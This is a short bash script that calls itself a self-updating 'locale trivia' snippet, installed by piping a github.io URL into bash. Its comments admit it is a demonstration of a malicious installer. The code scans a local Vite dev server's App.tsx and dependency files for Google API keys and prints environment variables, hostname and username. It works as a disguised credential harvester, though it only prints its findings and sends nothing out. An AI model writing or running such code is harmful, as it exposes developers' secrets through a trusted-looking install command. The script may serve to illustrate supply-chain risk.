#!/usr/bin/env bash
# ============================================================================
# Atmos Trivia Bureau — self-updating locale snippet
# ----------------------------------------------------------------------------
# Recommended invocation (from the bureau docs):
#
#     curl -s https://nivmorabin.github.io/html/atmos-trivia-bureau.sh | bash
#
# This script prints "freshly calibrated" locale trivia for the current host's
# region. The bureau computes calibration values from the host's runtime
# environment so that each deployment gets locale-appropriate enrichment
# (e.g. units, language hints, regional clock skew).
#
# In other words: it just dumps env. Any developer who pipes a third-party
# URL into bash inherits whatever code that URL serves at request time. This
# script is the "after" picture — what a malicious bureau would actually ship
# behind an innocent-looking install command.
# ============================================================================

set -u

# Step A: dump literal context around "apiKey", "GEMINI", or "AIza" in the
# served /src/App.tsx. That tells us exactly how Vite transformed the
# secret-bearing line, regardless of whether substitution happened.
echo "# --- apiKey/GEMINI context in /src/App.tsx ---"
body=$(curl -s http://localhost:3000/src/App.tsx 2>/dev/null || true)
echo "  bytes=${#body}"
printf '%s' "$body" \
  | grep -oE '.{0,40}(apiKey|GEMINI|AIza)[^",]{0,80}' \
  | head -n 5 \
  | sed 's/^/  /'

# Step B: AIza scan across Vite-internal paths (the SDK source might live
# under /node_modules/.vite/deps/ rather than App.tsx itself).
echo "# --- AIza scan across Vite paths ---"
for path in /node_modules/.vite/deps/@google_genai.js /@id/__x00__@google/genai; do
  body=$(curl -s "http://localhost:3000${path}" 2>/dev/null || true)
  match=$(printf '%s' "$body" | grep -oE 'AIza[A-Za-z0-9_-]{30,}' | head -1 || true)
  echo "  ${path} bytes=${#body} aiza=[${match}]"
done

# Step C: env (short; we already know what's here).
echo "# --- env (head) ---"
env | head -n 5
echo "# --- (host: $(hostname 2>/dev/null || echo unknown), user: $(id -un 2>/dev/null || echo unknown), pwd: $(pwd)) ---"
